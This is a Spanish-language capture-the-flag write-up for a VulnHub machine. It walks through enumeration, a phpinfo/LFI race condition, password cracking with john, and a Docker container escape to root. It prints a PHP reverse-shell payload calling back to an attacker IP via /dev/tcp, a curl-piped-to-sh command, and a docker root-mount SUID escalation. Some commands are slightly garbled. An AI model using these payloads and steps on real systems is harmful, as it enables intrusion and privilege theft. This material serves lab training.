___
- tags: #machine #linux #docker #gobuster #nmap #john #phpinfo #lfi #race_condition 
___
## Enumeración
### Nmap
```shell
# analisis todos los puertos
nmap --open -sS --min-rate 5000 -Pn -n -v 192.168.1.13 -oG all-ports

# analisis todos los puertos
nmap -p[puertos] -sCV -v 192.168.1.13 -oN targeted
```
### Identificación de launchpad
Es una distribución `Buster` según la información de `Apache httpd 2.4.38`. 
### Gobuster
```shell
gobuster dir -u http://192.168.1.13/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,php.bak,bak,txt,html

# rutas encontradas
# /img/
# /vendor/
# /info.php
# /server-status
# /.html
```

### phpinfo()
Encontramos este archivo y encontramos la siguiente información:

#### Apache Environment
```txt
# Server_ADDR
192.168.150.21 

# Remote Port
57584
```

#### Cambiando el tipo de petición de GET a POST
Cambiando el tipo de `request` de GET a POST logramos poder enviar información al servidor, donde logramos subir archivos
```txt
# Parte de la request
Content-Type: multipart/form-data; boundary=--pwned

----pwned

Content-Disposition: form-data; name="name"; filename="cmd.php"

Content-Type: text/plain



<?php system("bash -c 'bash -i >& /dev/tcp/192.168.1.84/443 0>&1'"); ?>

----pwned
```
## Explotación
### LFI
Encontramos con wfuzz un parámetro en index.php llamado `filename`
```shell
wfuzz -c --hl=136 -u "http://192.168.1.13/index.php?FUZZ=/etc/passwd" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

# encontramos 'filename' 
```

### Race Condition
Al ver que phpinfo nos permite crear un archivo temporalmente en cierta ruta y que nos interpreta php, utiilzamos un script en python que nos ayudará a que por medio de una condición de carrera nos permita acceder al archivo temporal antes de que se elimine.

## Escalada de privilegios
```shell
# buscamos usuarios -> no hay :c
ls -l /home/

# buscamos 'password' en los archivos
grep -r -i "password" -l

# buscamos la palabra 'config' en los archivos y nada ...
find \-name \*config\* 2>/dev/null
```

#### linPeas
Recurrimos a linPEAS porque no encontramos nada a primeras.
```shell
# From public github
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# encontramos -> /.oldkeys.tgz 
```

### Revisando .oldkeys.tgz
```shell
# descomprimimos -> le cambiamos el nombre antes
tar -xf oldkeys.tgz

# vemos que tipos de archivos son
file *

# root:        PEM DSA private key
# root.pub:    OpenSSH DSA public key
```

#### Obteniendo información de la máquina real
```shell
# leemos las direcciones ip - mac que el sistema conoce
cat /proc/net/arp

# encontramos una dirección
# 192.168.150.1 (máquina real)

# la ip de la máquina pwned es 192.168.1.21

# enviamos una cadena vacía por la utilidad /dev/tcp
echo '' > /dev/tcp/192.168.150.1/22

# revisamos el código de estado
$?

# respuesta -> 0 -> exitoso ;) 
```
#### John
```shell
# Con ssh2john obtenemos el hash para la clave del root
python2.7 /usr/share/john/ssh2john.py id_rsa > hash

# -> nos devuelve el hash de la clave

# creackeamos la clave
john -w=/usr/share/wordlists/rockyou.txt hash

# -> la clave : choclate93
```

Efectivamente se reutilizan las contraseñas del root, asi que somos root >:3.

### Saliendo del contenedor
Encontramos las nuevas claves en `/root/.ssh/`
```shell
# intentamos conectarnos por ssh nuevamente pero con el usuario encontraddo reutilizando credenciales
ssh admin@192.168.150.1

# nos pide la clave 
choclate93

# y wua
```

#### Escalando privilegios en la máquina real
```shell
# revisamos al usuario
id # -> vemos que está en el grupo docker

# revisamos las imagenes
docker images # -> theart42/infovore

# creamos un contenedor con una montura de la raiz
docker run -dit -v /:/mnt/root --name privesc theart42/infovore

# ejecutamos una bash interactiva desde el docker
docker exec -it privesc bash

# modificamos los permisos la /bin/bash desde la montura
cd /mnt/root
chmod bin/bash u+s

# y tuki ;)
```
## Flags
```txt

# root flag -> contenedor
FLAG{Congrats_on_owning_phpinfo_hope_you_enjoyed_it}

# admin flag -> maquina real
FLAG{Escaped_from_D0ck3r}

# root flag -> maquina real
FLAG{And_now_You_are_done}
```

## Apuntes
### Grep
- -l -> muestra los nombres de los archivos en vez del contenido
- -r -> de forma recursiva
- -i -> insensitive
___
## Referencias
- [phpinfolfi.py - python3 - github](https://github.com/metahumo/Documento_Hacker/tree/main/Machines/VulnHub/Infovore).
- [linPEAS - github](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS).